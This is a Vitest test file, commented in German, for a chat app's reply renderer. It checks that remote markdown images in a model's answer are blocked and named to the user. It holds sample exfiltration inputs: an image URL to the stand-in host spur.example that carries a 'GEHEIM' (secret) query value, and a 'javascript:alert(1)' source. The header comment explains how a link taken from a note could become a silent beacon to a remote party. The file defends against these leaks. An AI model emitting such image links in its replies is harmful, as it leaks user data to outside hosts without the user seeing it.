// @vitest-environment jsdom
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { Chat } from "../../src/components/Chat";
import { ToastProvider } from "../../src/components/ui/Toast";
import { saveAISettings, PROVIDERS } from "../../src/lib/ai";

// Punkt 4 und 8 am ausgelieferten Versprechen "no telemetry, no phone-home".
// Gemessen am Fenster-Buendel (P8-AUSSEN-PFADE-0211.md §2b) holt die Flaeche
// nichts von ausserhalb — ausser einem Bild, das eine Modell-Antwort mitbringt:
// react-markdown malt dafuer ein img-Element, und der Inhalts-Sicherheitsplan
// liess mit einem blanken `https:` in img-src jedes ferne Bild zu. Ein Link in
// einer Notiz, den das Modell in die Antwort uebernimmt, war damit ein
// Leser-Beweis an eine Gegenstelle — ohne dass der Nutzer etwas davon sah.
//
// Diese Pruefung haelt beide Seiten zusammen: die Abweisung mit NAMEN (nicht als
// kaputtes Bild) und die Ausname davon (eigne und eingebettete Bilder muessen
// weiter gemalt werden).

let anfragen: { url: string }[];

function sseAntwort(stuecke: string[]): Response {
  const koerper = new ReadableStream<Uint8Array>({
    start(c) {
      const enc = new TextEncoder();
      for (const s of stuecke) c.enqueue(enc.encode(`data: ${JSON.stringify({ text: s })}\n\n`));
      c.enqueue(enc.encode("data: [DONE]\n\n"));
      c.close();
    },
  });
  return new Response(koerper, { status: 200, headers: { "Content-Type": "text/event-stream" } });
}

function stubFetch(antwort: string[]) {
  anfragen = [];
  vi.stubGlobal("fetch", vi.fn(async (url: string) => {
    anfragen.push({ url });
    if (url.includes("/api/chat/stream")) return sseAntwort(antwort);
    return new Response("{}", { status: 200 });
  }));
}

beforeEach(() => {
  localStorage.clear();
  const anbieter = PROVIDERS.find((p) => p.needsKey) ?? PROVIDERS[0];
  saveAISettings({ providerId: anbieter.id, apiKey: "sk-test", baseUrl: anbieter.baseUrl, model: anbieter.defaultModel });
  Element.prototype.scrollIntoView = vi.fn();
});
afterEach(() => { vi.unstubAllGlobals(); vi.restoreAllMocks(); });

/** Fragt den Chat und wartet, bis die gegebene Stelle der Antwort steht. */
async function antwortAnsehen(antwort: string[], sichtbar: RegExp) {
  stubFetch(antwort);
  const user = userEvent.setup();
  const view = render(<ToastProvider><Chat activeMemories={[]} /></ToastProvider>);
  await user.type(screen.getByRole("textbox"), "Was siehst du?");
  await user.keyboard("{Enter}");
  await waitFor(() => expect(anfragen.some((a) => a.url.includes("/api/chat/stream"))).toBe(true));
  await waitFor(() => expect(view.container.textContent).toMatch(sichtbar));
  return view;
}

describe("Eine Antwort mit einem fernen Bild", () => {
  it("laedt das ferne Bild nicht — kein img-Ziel aus dem Netz", async () => {
    const { container } = await antwortAnsehen(
      ["Hier:\n\n![Spur](https://spur.example/p.gif?i=GEHEIM)"],
      /Hier:/,
    );
    const bilder = Array.from(container.querySelectorAll("img"));
    expect(
      bilder.filter((b) => /^https?:\/\//.test(b.getAttribute("src") ?? "")),
      "ein fernes Bild wird geladen: " + bilder.map((b) => b.getAttribute("src")).join(", "),
    ).toHaveLength(0);
  });

  it("sagt offen, dass das Bild blieb, und nennt die Gegenstelle", async () => {
    const { container } = await antwortAnsehen(
      ["Hier:\n\n![Spur](https://spur.example/p.gif?i=GEHEIM)"],
      /Hier:/,
    );
    const zeile = container.querySelector('[data-testid="bild-abgewiesen"]');
    expect(zeile, "keine Abweisungs-Zeile gemalt").not.toBeNull();
    expect(zeile!.textContent).toContain("Remote image not loaded");
    expect(zeile!.textContent).toContain("spur.example");
  });

  it("der Ausweg ist ein Auftrag der Hand, nicht unser Abzug", async () => {
    const { container } = await antwortAnsehen(
      ["Hier:\n\n![Spur](https://spur.example/p.gif?i=GEHEIM)"],
      /Hier:/,
    );
    const weg = container.querySelector('[data-testid="bild-abgewiesen"] a');
    expect(weg, "die Abweisung hat keinen Ausweg").not.toBeNull();
    expect(weg!.getAttribute("href")).toBe("https://spur.example/p.gif?i=GEHEIM");
    expect(weg!.getAttribute("target")).toBe("_blank");
    expect(weg!.getAttribute("rel")).toContain("noreferrer");
  });

  it("malt eingebettete Bilder und die vom eignen Rechner weiter", async () => {
    const { container } = await antwortAnsehen(
      ["Eingebettet:\n\n![daten](data:image/gif;base64,R0lGODlhAQABAAAAACg=)",
       "\nVom Rechner:\n\n![lokal](http://127.0.0.1:3478/bild.png)"],
      /Vom Rechner:/,
    );
    const bilder = Array.from(container.querySelectorAll("img")).map((b) => b.getAttribute("src") ?? "");
    expect(bilder.some((s) => s.startsWith("data:image"))).toBe(true);
    expect(bilder.some((s) => s.startsWith("http://127.0.0.1"))).toBe(true);
    expect(container.querySelector('[data-testid="bild-abgewiesen"]')).toBeNull();
  });

  it("schweigt, wenn die Antwort gar kein Bild traegt", async () => {
    const { container } = await antwortAnsehen(["Ganz ohne Bild."], /Ganz ohne Bild\./);
    expect(container.querySelector('[data-testid="bild-abgewiesen"]')).toBeNull();
    expect(container.querySelectorAll("img")).toHaveLength(0);
  });

  it("ein nackter Bild-Link bleibt ein Text, kein Abzug", async () => {
    const { container } = await antwortAnsehen(["Als link: https://spur.example/p.gif"], /Als link:/);
    expect(container.querySelectorAll("img")).toHaveLength(0);
  });

  it("malt kein Bild mit leerer Quelle — die Seite ladet nicht noch einmal", async () => {
    // Der alte Weg: react-markowns eigne Umwandlung leert jede data:-Adresse, und
    // ein img mit src="" holt im Chromium die Seite selbst ein zweites Mal.
    // data:image/svg bleibt leer (nur Raster ist erlaubt) — dann muss die Zeile
    // stehen und kein Bild, und vor allem kein Bild ohne Quelle.
    const { container } = await antwortAnsehen(
      ["Hier:\n\n![vektor](data:image/svg+xml;base64,PHN2Zy8+)"],
      /Hier:/,
    );
    expect(container.querySelectorAll('img[src=""]')).toHaveLength(0);
    expect(container.querySelectorAll("img")).toHaveLength(0);
    expect(container.querySelector('[data-testid="bild-abgewiesen"]')).not.toBeNull();
  });

  it("wiesst eine Adresse ab, die kein Bild sein kann, und erfindet keinen Ausweg", async () => {
    const { container } = await antwortAnsehen(
      ["Hier:\n\n![x](javascript:alert(1))"],
      /Hier:/,
    );
    expect(container.querySelectorAll("img")).toHaveLength(0);
    const zeile = container.querySelector('[data-testid="bild-abgewiesen"]');
    expect(zeile, "eine unmoegliche Bildquelle bleibt ohne Zeile").not.toBeNull();
    expect(zeile!.querySelector("a"), "die Abweisung bietet einen Ausweg, wo keiner ist").toBeNull();
  });
});
